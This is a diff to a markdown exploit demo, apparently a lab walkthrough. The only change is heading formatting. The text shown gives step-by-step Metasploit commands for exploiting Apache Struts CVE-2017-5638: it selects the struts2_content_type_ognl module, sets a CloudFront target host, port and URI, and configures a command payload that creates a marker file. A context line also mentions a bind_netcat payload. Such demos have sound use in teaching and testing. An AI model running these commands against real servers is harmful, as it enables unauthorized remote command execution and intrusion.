@@ -39,15 +39,15 @@ set PAYLOAD cmd/unix/bind_netcat
 
 
 ### Exploit demo execution steps:
-####Step 1:Open metasploit in attacker system 
+#### Step 1:Open metasploit in attacker system 
 
-####step 2: search for the CVE-2017-5638
+#### step 2: search for the CVE-2017-5638
 msf>search CVE-2017-5638
 
-####step 3: use the exploit
+#### step 3: use the exploit
 msf> use exploit/multi/http/struts2_content_type_ognl
 
-####step 4: configure the application paramenter in exploit options
+#### step 4: configure the application paramenter in exploit options
 msf exploit> show options
 msf exploit> set RHOST <Domain name of cloudfront> 
 msf exploit> set RPORT 80
@@ -55,7 +55,7 @@ msf exploit> set TARGETURI struts2_2.3.15.1-showcase/showcase.action
 msf exploit> show options
 
 
-####step 5: configure payload
+#### step 5: configure payload
 msf exploit> set PAYLOAD cmd/unix/generic
 msf exploit> show payload
 msf exploit> set CMD "touch /tmp/hackedsystemexec64"
